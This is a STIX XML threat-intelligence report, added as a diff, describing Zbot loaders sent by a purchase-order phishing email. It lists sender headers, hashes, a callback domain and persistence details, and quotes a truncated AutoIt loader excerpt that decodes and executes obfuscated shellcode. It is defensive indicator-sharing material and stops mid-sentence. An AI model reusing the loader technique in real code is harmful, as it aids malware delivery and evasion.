@@ -1,0 +1,1396 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:WinRegistryKeyObj="http://cybox.mitre.org/objects#WinRegistryKeyObject-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:EmailMessageObj="http://cybox.mitre.org/objects#EmailMessageObject-2" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:AddrObj="http://cybox.mitre.org/objects#AddressObject-2" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:marking="http://data-marking.mitre.org/Marking-1" id="CISCP:IB-13-10397" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Malware and configuration files associated to Zbot delivered via Purchase Order themed phishing email</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On April 4, 2013 an email was discovered that contained a suspicious attachment. Malware samples were submitted for analysis. The submitted files "osof.exe" and "Quotation.exe" are both loaders for the same variant of the Zbot malware. This sample calls back to the URL "santaizel.info" via port 80.
+
+The submitted file "config.bin" is an encrypted configuration file downloaded by the Zbot malware. This file contains malicious HTML code and JavaScript written to exploit specific websites.
+
+http://onlinebanking.norisbank.de
+http://online.lloydstsb.co.uk
+
+This report incorporates data originating from MIFR-286377.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-07-12T16:39:23Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-459c9d38-5ea7-47f3-82e2-763de9abd59e" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-51f2f2de-8dab-4f64-83f6-bcc2ff619602"/>
+        <indicator:Indicator idref="CISCP:indicator-8e488141-63ab-4676-873b-d164a8575296"/>
+        <indicator:Indicator idref="CISCP:indicator-460ac3d7-d411-4a7c-9a19-a837e1545f4a"/>
+        <indicator:Indicator idref="CISCP:indicator-ba905541-0a55-40a9-bf0c-9b34d8b50a01"/>
+        <indicator:Indicator idref="CISCP:indicator-bbf8c609-e48c-48b3-9f8f-4a711c717e62"/>
+        <indicator:Indicator idref="CISCP:indicator-41089c9b-5856-4502-852e-0cdd774111ab"/>
+        <indicator:Indicator idref="CISCP:indicator-7ad0bb74-309e-4eba-b7aa-e21d1df2eba1"/>
+        <indicator:Indicator idref="CISCP:indicator-158a97bc-9f15-458f-be38-e2f2e3f8ca26"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-51f2f2de-8dab-4f64-83f6-bcc2ff619602" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malicious E-mail</indicator:Type>
+      <indicator:Description>This is the message that was first observed sending this malicious payload.
+
+-----BEGIN EMAIL HEADERS-----
+Received: from mail.cantonfairtrading.org.cn ([59.42.254.116]) 
+	by [REDACTED] with ESMTP id r34BZTkw010022-r34BZTl0010022 
+	(version=TLSv1 cipher=DHE-RSA-AES256-SHA bits=256 verify=NO) 
+	for; Thu, 4 Apr 2013 07:36:03 -0400 
+Received: from localhost (unknown [127.0.0.1])
+	by mail.cantonfairtrading.org.cn (Postfix) with ESMTP id 7C46C2C78C5; 
+	Thu, 4 Apr 2013 19:35:11 +0800 (CST) 
+MIME-Version: 1.0 
+Content-Type: multipart/mixed; 
+boundary="=_fe17a8b9f5decc5a1a73c8e486edc90f" 
+Date: Thu, 04 Apr 2013 12:35:11 +0100 
+From: Fiona Chen &lt;fiona.chen@cantonfairtrading.org.cn&gt; 
+To: undisclosed-recipients:; 
+Subject: Fwd: PURCHASE ORDER,SAMPLE CATALOGUE/DESIGN 
+Message-ID: &lt;18be1db66bacc9682f64f695e8da5a61@cantonfairtrading.org.cn&gt; 
+X-Sender: fiona.chen@cantonfairtrading.org.cn 
+User-Agent: Roundcube Webmail/0.7.2
+-----END EMAIL HEADERS-----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-1410327a-d666-4968-a578-823bde54afe7">
+        <cybox:Object id="CISCP:Object-57ccdb09-6a45-45b5-81a2-4332d1f14c0b">
+          <cybox:Properties xsi:type="EmailMessageObj:EmailMessageObjectType">
+            <EmailMessageObj:Header>
+              <EmailMessageObj:From category="e-mail">
+                <AddrObj:Address_Value condition="Equals">fiona.chen@cantonfairtrading.org.cn</AddrObj:Address_Value>
+              </EmailMessageObj:From>
+              <EmailMessageObj:Subject condition="Equals">Fwd: PURCHASE ORDER##comma##SAMPLE CATALOGUE/DESIGN</EmailMessageObj:Subject>
+              <EmailMessageObj:Message_ID condition="Equals">18be1db66bacc9682f64f695e8da5a61@cantonfairtrading.org.cn</EmailMessageObj:Message_ID>
+              <EmailMessageObj:Sender category="e-mail">
+                <AddrObj:Address_Value condition="Equals">fiona.chen@cantonfairtrading.org.cn</AddrObj:Address_Value>
+              </EmailMessageObj:Sender>
+            </EmailMessageObj:Header>
+            <EmailMessageObj:Attachments>
+              <EmailMessageObj:File object_reference="CISCP:Object-03c522c2-1bc4-4b0c-9e26-1e2a87155096"/>
+            </EmailMessageObj:Attachments>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-04T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-8e488141-63ab-4676-873b-d164a8575296" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This is the file that was attached to the email.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-bcf7f3b1-c24a-40a6-9407-6046af800756">
+        <cybox:Object id="CISCP:Object-03c522c2-1bc4-4b0c-9e26-1e2a87155096">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Quotation.zip</FileObj:File_Name>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-04-04T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-460ac3d7-d411-4a7c-9a19-a837e1545f4a" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Section Hashes:
+1739f8dc6d8b7dfe87fad9f75b549db4 (header) 1024
+61ffce4768976fa0dd2a8f6a97b1417a .text 526336
+0354bc5f2376b5e9a4a3ba38b682dff1 .rdata 57344
+8033f5a38941b4685bc2299e78f31221 .data 26624
+94e765ccd959c13fb4c00f9eb5319550 .rsrc 300544
+
+Compile Date:
+2012-01-29 21:32:28 UTC
+
+The submitted file is an AutoIt compiled binary file. AutoIt is a freeware BASIC-like scripting language designed for automating the Windows GUI and general purpose scripting.
+
+This file contains embedded shellcode to be decoded and executed at runtime. The shellcode is present in the script section of the file in a series of strings. The strings also contain extraneous characters. Before the code can be executed, these characters are removed and the string is reversed. The resulting strings are concatenated, converted to binary data, loaded into memory and executed. The excerpt below is a portion of the script that contains the encoded strings and the method for decoding as well as the method of execution.
+
+STRING DECODE AND CONCATENATE:
+$BinaryData = StringReplace(_stringreverse("'9'8'0'1'B'5'B'8'B' ...., "")
+&amp; StringReplace(_stringreverse("=0=0=A=6=F=F=F=F=B=F= .... "=", "")
+&amp; StringReplace(_stringreverse("&#231;0&#231;0&#231;A&#231;6&#231;F&#231;F&#231;F&#231;F&#231;C&#231;F&#231; .... "&#231;", "")
+&amp; StringReplace(_stringreverse(")8)1)9)8)6)6)8)0)9)5) .... ")", "")
+&amp; StringReplace(_stringreverse("&#232;F&#232;F&#232;0&#232;0&#232;0&#232;0&#232;1&#232;0&#232;4&#232;F&#232; .... "&#232;", "")
+&amp; StringReplace(_stringreverse("&#8208;F&#8208;F&#8208;C&#8208;F&#8208;8&#8208;A&#8208;5&#8208;B&#8208;F&#8208;F&#8208; .... "&#8208;", "")
+&amp; StringReplace(_stringreverse("_C_3_D_9_9_8_F_F_F_F_ .... "_", "")
+&amp; StringReplace(_stringreverse("&#233;C&#233;F&#233;3&#233;1&#233;5&#233;8&#233;D&#233;8&#233;F&#233;F&#233; .... "&#233;", "")
+&amp; StringReplace(_stringreverse("&#224;F&#224;F&#224;8&#224;F&#224;2&#224;C&#224;8&#224;E&#224;F&#224;F&#224; .... "&#224;", "")
+&amp; StringReplace(_stringreverse("'3'C'9'C'3'D'F'F'0'9' .... "'", "")
+
+EXECUTE SHELLCODE:
+$DllStructure = DllStructCreate(StringReplace("kbkyktkek[k2k0k6k2k]k", "k", ""))
+//byte(202)
+DllStructSetData($DllStructure, 1, $BinaryData)
+$DllGetPtr = DllStructGetPtr($DllStructure)
+_winapi_callwindowproc($DllGetPtr + 5 + 6 + 7 + 5 + 0 + 5 + 7 + 0 + 4 + 7 + 0 + 70, 0, 0, 0, 0)
+
+The embedded shellcode is responsible for decoding an embedded PE file and executing the file via process injection. Since the PE file is not written to disk it has no significant file name. This memory resident file has the following MD5 hash value: f02f58d28d384ed056beb531bc4c1edb.
+
+-----BEGIN RELEVANT STRING DATA-----
+This is a compiled AutoIt script. AV researchers please email
+avsupport@autoitscript.com for support.
+runas
+AutoIt v3
+edit
+&gt;&gt;&gt;AUTOIT NO CMDEXECUTE&lt;&lt;&lt;
+CMDLINERAW
+CMDLINE
+/ErrorStdOut
+/AutoIt3OutputDebug
+/AutoIt3ExecuteLine
+/AutoIt3ExecuteScript
+Software\AutoIt v3\AutoIt
+au3
+#include depth exceeded. Make sure there are no recursive includes
+Error opening the file
+Unterminated string
+#notrayicon
+#requireadmin
+#NoAutoIt3Execute
+#OnAutoItStartRegister
+#include&#8208;once
+Cannot parse #include
+#comments&#8208;start
+#cs
+Unterminated group of comments
+#comments&#8208;end
+#ce
+&gt;&gt;&gt;AUTOIT SCRIPT&lt;&lt;&lt;
+$Id: qmath.h,v 1.1 2004/01/15 19:50:35 jonbennett Exp $
+%tEXtdate:create
+2012-11-20T09:04:43-06:00
+%tEXtdate:modify
+2012-11-20T08:59:23-06:00
+VS_VERSION_INFO
+StringFileInfo
+040904b0
+Comments
+CompanyName
+JetAudio, Inc.
+FileDescription
+jetAudio
+FileVersion
+8, 0, 17, 2010
+InternalName
+jetAudio
+LegalCopyright
+Copyright (C) 2001&#8208;2011 JetAudio, Inc.
+LegalTrademarks
+OriginalFilename
+JetAudio.exe
+PrivateBuild
+ProductName
+jetAudio
+ProductVersion
+8, 0, 0, 0
+SpecialBuild
+VarFileInfo
+Translation
+VS_VERSION_INFO
+StringFileInfo
+080904b0
+FileDescription
+FileVersion
+3, 3, 8, 1
+CompiledScript
+AutoIt v3 Script: 3, 3, 8, 1
+VarFileInfo
+Translation
+&lt;assembly xmlns="urn:schemas&#8208;microsoft&#8208;com:asm.v1" manifestVersion="1.0"&gt;
+&lt;trustInfo xmlns="urn:schemas&#8208;microsoft&#8208;com:asm.v3"&gt;
+&lt;security&gt;
+&lt;requestedPrivileges&gt;
+&lt;requestedExecutionLevel level="asInvoker"
+uiAccess="false"&gt;&lt;/requestedExecutionLevel&gt;
+&lt;/requestedPrivileges&gt;
+&lt;/security&gt;
+&lt;/trustInfo&gt;
+&lt;dependency&gt;
+&lt;dependentAssembly&gt;
+&lt;assemblyIdentity type="win32" name="Microsoft.Windows.Common&#8208;Controls"
+version="6.0.0.0" language="*" processorArchitecture="*"
+publicKeyToken="6595b64144ccf1df"&gt;&lt;/assemblyIdentity&gt;
+&lt;/dependentAssembly&gt;
+&lt;/dependency&gt;
+&lt;/assembly&gt;
+-----END RELEVANT STRING DATA-----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5df250ca-32a5-45c9-b88d-528fae4c4250">
+        <cybox:Object id="CISCP:Object-b4ae352f-a0f1-4b65-966b-f07e6287532f">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">osof.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">983399</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">1c8141a7f5d01308ff6d40fd32f58707</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">506257f071227e5521698c8989b848850240f9fe</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">6327664b27a3bfad27961909d1233e9113f9b8a7eea0b5aaabf2d731bb041fdf</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">24576:6RmJkcoQricOIQxiZY1ia/N8dGhuwfa25AqV:fJZoQrbTFZY1iaaGla253</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-05-29T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-ba905541-0a55-40a9-bf0c-9b34d8b50a01" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>Section Hashes:
+1739f8dc6d8b7dfe87fad9f75b549db4 (header) 1024
+61ffce4768976fa0dd2a8f6a97b1417a .text 526336
+0354bc5f2376b5e9a4a3ba38b682dff1 .rdata 57344
+8033f5a38941b4685bc2299e78f31221 .data 26624
+94e765ccd959c13fb4c00f9eb5319550 .rsrc 300544
+
+Compile Date:
+2012-01-29 21:32:28 UTC
+
+The submitted file is an AutoIt compiled binary file. AutoIt is a freeware BASIC-like scripting language designed for automating the Windows GUI and general purpose scripting.
+
+This file contains embedded shellcode to be decoded and executed at runtime. The shellcode is present in the script section of the file in a series of strings. The strings also contain extraneous characters. Before the code can be executed, these characters are removed and the string is reversed. The resulting strings are concatenated, converted to binary data, loaded into memory and executed. The excerpt below is a portion of the script that contains the encoded strings and the method for decoding as well as the method of execution.
+
+STRING DECODE AND CONCATENATE:
+$BinaryData = StringReplace(_stringreverse("'9'8'0'1'B'5'B'8'B' ...., "")
+&amp; StringReplace(_stringreverse("=0=0=A=6=F=F=F=F=B=F= .... "=", "")
+&amp; StringReplace(_stringreverse("&#231;0&#231;0&#231;A&#231;6&#231;F&#231;F&#231;F&#231;F&#231;C&#231;F&#231; .... "&#231;", "")
+&amp; StringReplace(_stringreverse(")8)1)9)8)6)6)8)0)9)5) .... ")", "")
+&amp; StringReplace(_stringreverse("&#232;F&#232;F&#232;0&#232;0&#232;0&#232;0&#232;1&#232;0&#232;4&#232;F&#232; .... "&#232;", "")
+&amp; StringReplace(_stringreverse("&#8208;F&#8208;F&#8208;C&#8208;F&#8208;8&#8208;A&#8208;5&#8208;B&#8208;F&#8208;F&#8208; .... "&#8208;", "")
+&amp; StringReplace(_stringreverse("_C_3_D_9_9_8_F_F_F_F_ .... "_", "")
+&amp; StringReplace(_stringreverse("&#233;C&#233;F&#233;3&#233;1&#233;5&#233;8&#233;D&#233;8&#233;F&#233;F&#233; .... "&#233;", "")
+&amp; StringReplace(_stringreverse("&#224;F&#224;F&#224;8&#224;F&#224;2&#224;C&#224;8&#224;E&#224;F&#224;F&#224; .... "&#224;", "")
+&amp; StringReplace(_stringreverse("'3'C'9'C'3'D'F'F'0'9' .... "'", "")
+
+EXECUTE SHELLCODE:
+$DllStructure = DllStructCreate(StringReplace("kbkyktkek[k2k0k6k2k]k", "k", ""))
+//byte(202)
+DllStructSetData($DllStructure, 1, $BinaryData)
+$DllGetPtr = DllStructGetPtr($DllStructure)
+_winapi_callwindowproc($DllGetPtr + 5 + 6 + 7 + 5 + 0 + 5 + 7 + 0 + 4 + 7 + 0 + 70, 0, 0, 0, 0)
+
+The embedded shellcode is responsible for decoding an embedded PE file and executing the file via process injection. Since the PE file is not written to disk it has no significant file name. This memory resident file has the following MD5 hash value: f02f58d28d384ed056beb531bc4c1edb.
+
+-----BEGIN RELEVANT STRING DATA-----
+This is a compiled AutoIt script. AV researchers please email
+avsupport@autoitscript.com for support.
+runas
+AutoIt v3
+edit
+&gt;&gt;&gt;AUTOIT NO CMDEXECUTE&lt;&lt;&lt;
+CMDLINERAW
+CMDLINE
+/ErrorStdOut
+/AutoIt3OutputDebug
+/AutoIt3ExecuteLine
+/AutoIt3ExecuteScript
+Software\AutoIt v3\AutoIt
+au3
+#include depth exceeded. Make sure there are no recursive includes
+Error opening the file
+Unterminated string
+#notrayicon
+#requireadmin
+#NoAutoIt3Execute
+#OnAutoItStartRegister
+#include&#8208;once
+Cannot parse #include
+#comments&#8208;start
+#cs
+Unterminated group of comments
+#comments&#8208;end
+#ce
+&gt;&gt;&gt;AUTOIT SCRIPT&lt;&lt;&lt;
+$Id: qmath.h,v 1.1 2004/01/15 19:50:35 jonbennett Exp $
+%tEXtdate:create
+2012-11-20T09:04:43-06:00
+%tEXtdate:modify
+2012-11-20T08:59:23-06:00
+VS_VERSION_INFO
+StringFileInfo
+040904b0
+Comments
+CompanyName
+JetAudio, Inc.
+FileDescription
+jetAudio
+FileVersion
+8, 0, 17, 2010
+InternalName
+jetAudio
+LegalCopyright
+Copyright (C) 2001&#8208;2011 JetAudio, Inc.
+LegalTrademarks
+OriginalFilename
+JetAudio.exe
+PrivateBuild
+ProductName
+jetAudio
+ProductVersion
+8, 0, 0, 0
+SpecialBuild
+VarFileInfo
+Translation
+VS_VERSION_INFO
+StringFileInfo
+080904b0
+FileDescription
+FileVersion
+3, 3, 8, 1
+CompiledScript
+AutoIt v3 Script: 3, 3, 8, 1
+VarFileInfo
+Translation
+&lt;assembly xmlns="urn:schemas&#8208;microsoft&#8208;com:asm.v1" manifestVersion="1.0"&gt;
+&lt;trustInfo xmlns="urn:schemas&#8208;microsoft&#8208;com:asm.v3"&gt;
+&lt;security&gt;
+&lt;requestedPrivileges&gt;
+&lt;requestedExecutionLevel level="asInvoker"
+uiAccess="false"&gt;&lt;/requestedExecutionLevel&gt;
+&lt;/requestedPrivileges&gt;
+&lt;/security&gt;
+&lt;/trustInfo&gt;
+&lt;dependency&gt;
+&lt;dependentAssembly&gt;
+&lt;assemblyIdentity type="win32" name="Microsoft.Windows.Common&#8208;Controls"
+version="6.0.0.0" language="*" processorArchitecture="*"
+publicKeyToken="6595b64144ccf1df"&gt;&lt;/assemblyIdentity&gt;
+&lt;/dependentAssembly&gt;
+&lt;/dependency&gt;
+&lt;/assembly&gt;
+-----END RELEVANT STRING DATA-----</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-fa18d0ae-2997-46ae-8c21-b60e2d746df2">
+        <cybox:Object id="CISCP:Object-1483f4a5-81cb-447b-91d9-392f8ad9ccdc">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Quotation.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">983399</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">76684bddcd36f3a1449a4c205a94e9cc</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">e2222ecdee8b98c341eaa69726efeeb321a52e63</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">d345f5abac56bae5e948757b1f328fac8ced865f87d71abac85199a35dc88b93</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">24576:6RmJkcoQricOIQxiZY1ia/N8dGhuwfaw5AqV:fJZoQrbTFZY1iaaGlaw53</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-05-29T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-bbf8c609-e48c-48b3-9f8f-4a711c717e62" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This is a memory resident (RAM only) file that is spawned from either of the other two files, reported here as osof.exe (MD5: 1c8141a7f5d01308ff6d40fd32f58707) and Quotation.exe (MD5: 76684bddcd36f3a1449a4c205a94e9cc).
+
+Section Hashes:
+540baa04601e9fe68a50bf13c99df1b1 (header) 1024
+a6efe60002d26721d0e623c9604a9d88 .text 132608
+0619ec493ea717cd374c8d2e06bf965a .data 1024
+58149325ba186b8a3a272356951cb69c .reloc 6144
+
+This file is a variant of the Zbot malware. This sample is loaded into memory by the loader (Quotation.exe or osof.exe) and executed via process injection. When executed, the malware performs the following actions on the victim host:
+
+A new directory named "Ebuh" is created in the "c:\Documents and Settings\[USER]\Application Data\" directory.
+A copy of the loader file (Quotation.exe or osof.exe) is dropped into the "Ebuh" directory with the file name "xogy.exe" and is executed.
+
+The loader file is deleted using a batch file (see below).
+
+NOTE: The directory name and the file name used above during execution are not static names. The names change with each iteration of the loader file. The malware injects itself into the Windows system process "explorer.exe". Once running under the Windows system process, the malware performs the following actions:
+
+The following registry keys are queried:
+Key:HKLM\Software\Microsoft\InternetExplorer\PhishingFilter
+Key:HKLM\Software\Microsoft\InternetExplorer\Privacy
+Value: "CleanCookies"
+Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones
+Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\1
+Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\2
+Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\3
+Key: HKLM\Software\Microsoft\Windows\CurrentVersion\InternetSettings\Zones\4
+Value: "1609", "1406"
+
+The malware calls back to the URL "santaizel.info" via port 80 (see GET request below). The malware code also opens a local port and begins listening. The port used for the listener is not static and changes with each iteration of the malware.
+
+If the configuration file "config.bin" is provided to the malware, additional beaconing begins.
+
+NOTE: The requests use the HTTP standard and are sent via a socket opened by the malware on the victim host.
+
+GOOGLE GET REQUEST:
+GET /webhp HTTP/1.1
+Accept: */*
+Connection: Close
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+Host: www.google.com
+Cache-Control: no-cache
+
+The GET request above sent to "google.com" is likely a mechanism for checking the Internet connection of the victim host.
+
+The malware is also responsible for entrenching the dropped file in the registry under the following registry key:
+KEY: \\HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\
